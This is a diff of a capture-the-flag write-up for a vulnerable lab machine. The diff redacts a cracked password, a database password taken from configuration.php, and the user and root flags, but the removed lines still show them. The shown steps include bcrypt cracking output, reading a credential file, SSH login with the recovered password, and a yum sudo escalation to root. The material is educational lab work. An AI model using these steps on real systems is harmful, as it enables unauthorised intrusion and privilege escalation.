@@ -94,7 +94,7 @@ Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 1024 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-spiderman123     (?)
+***********   (?)
 1g 0:00:09:27 DONE (2020-06-14 17:12) 0.001762g/s 82.55p/s 82.55c/s 82.55C/s sweetsmile..speciala
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
@@ -114,7 +114,7 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 17. We can see only user named `jjameson` with command `ls /home`.
-18. After some digging we got some password `nv5uz9r3ZEDzVjNu` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
+18. After some digging we got some password `*************` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
 19. So used the password to login ssh as user `jjameson` and got the flag
 ```bash ssh jjameson@10.10.250.153
 The authenticity of host '10.10.250.153 (10.10.250.153)' can't be established.
@@ -122,12 +122,12 @@ ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.250.153' (ED25519) to the list of known hosts.
-jjameson@10.10.250.153's password: nv5uz9r3ZEDzVjNu
+jjameson@10.10.250.153's password: 
 Last login: Tue Mar  5 04:27:31 2024
 [jjameson@dailybugle ~]$ cat /home/jjameson/user.txt
-27a260fe3cba712cfdedb1c86d80442e
+**************************
 ```
-20. Question `What is the user flag?` Answer `27a260fe3cba712cfdedb1c86d80442e`
+20. Question `What is the user flag?` Answer `**************************`
 21. Using `sudo -l` command shows `/usr/bin/yum`.
 ```bash
 sudo -l
@@ -175,9 +175,9 @@ sudo yum -c $TF/x --enableplugin=y
 sh-4.2# id
 uid=0(root) gid=0(root) groups=0(root)
 sh-4.2# cat /root/root.txt
-eec3d53292b1821868266858d7fa6f79
+******************************
 ```
-25. Question `What is the root flag?` Answer `eec3d53292b1821868266858d7fa6f79`
+25. Question `What is the root flag?` Answer `**************************`
 
 ## Credits
 
